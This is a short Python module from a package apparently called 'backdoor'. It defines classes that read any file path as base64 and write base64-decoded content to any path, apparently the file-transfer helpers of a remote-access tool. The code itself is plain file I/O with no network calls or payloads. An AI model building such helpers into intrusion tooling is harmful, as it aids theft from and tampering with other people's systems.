from base64 import b64decode, b64encode
from pathlib import Path

from backdoor.exceptions.core import InvalidArgumentException
from backdoor.files.exceptions import FileNotFoundException


class FileReader:

    def read(self, path: str) -> bytes:
        fpath = Path(path).absolute()
        if not fpath.exists():
            raise FileNotFoundException("file not found")
        if fpath.is_dir():
            raise InvalidArgumentException("cannot read directory")
        with open(fpath, mode="rb") as f:
            return b64encode(f.read())


class FileWriter:

    def write(self, file_content: bytes, path: str) -> None:
        fpath = Path(path).absolute()
        with open(fpath, mode="wb") as f:
            f.write(b64decode(file_content))
